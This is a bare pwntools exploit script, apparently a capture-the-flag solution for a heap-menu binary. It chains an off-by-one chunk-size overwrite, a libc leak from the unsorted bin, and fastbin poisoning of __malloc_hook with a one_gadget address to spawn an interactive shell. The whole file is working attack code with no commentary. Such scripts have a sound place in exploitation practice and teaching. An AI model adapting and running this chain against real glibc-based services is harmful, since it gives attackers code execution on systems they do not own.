from pwn import *
context(os="linux",arch="amd64",log_level="debug")
p=process("./pwn")
#p=remote("node5.buuoj.cn",27105)
elf=ELF("pwn")

def debug():
    gdb.attach(p)
    pause()

def Add(size):
    p.recvuntil(b"choice: ")
    p.sendline(b"1")
    p.recvuntil(b"size: ")
    p.sendline(str(size))

def Write(index,size,content):
    p.recvuntil(b"choice: ")
    p.sendline(b"2")
    p.recvuntil(b"index: ")
    p.sendline(str(index))
    p.recvuntil(b"size: ")
    p.sendline(str(size))
    p.recvuntil(b"content: ")
    p.send(content)

def drop(index):
    p.recvuntil(b"choice: ")
    p.sendline(b"3")
    p.recvuntil(b"index: ")
    p.sendline(str(index))

def show(index):
    p.recvuntil(b"choice: ")
    p.sendline(b"4")
    p.recvuntil(b"index: ")
    p.sendline(str(index))

Add(0x18)
Add(0x10)
Add(0x80)
Add(0x10)
#debug()
Write(0,0x22,p64(0)*3+p8(0xb1))
#Write(2,0x8a,p64(0)*0x11+p64(0x))
drop(1)
#debug()
Add(0xa8)
Write(1,0x20,p64(0)*3+p64(0x91))
drop(2)
show(1)
#debug()
main_arena88=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("main_arena88_addr :",main_arena88)
#libc=ELF("libc-2.23.so")
libc=ELF("glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
libc_base=main_arena88-3951480
malloc_hook=libc_base+libc.sym["__malloc_hook"]
ls = [0x45216,0x4526a,0xf02a4,0xf1147]
ls = [0x4527a,0xf03a4,0xf1247]
one_gadget=libc_base+ls[2]

#debug()
Add(0x60)
#debug()
drop(2)
#debug()
payload1=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)*2
payload1+=p64(0)*15
Write(1,0xa8,payload1)

#debug()
Add(0x60)
#debug()
Add(0x60)
realloc_hook=libc_base+libc.sym["realloc"]
payload2=b"a"*11+p64(one_gadget)+p64(realloc_hook+4)
Write(4,27,payload2)
Add(0x60)
p.interactive()
#debug()
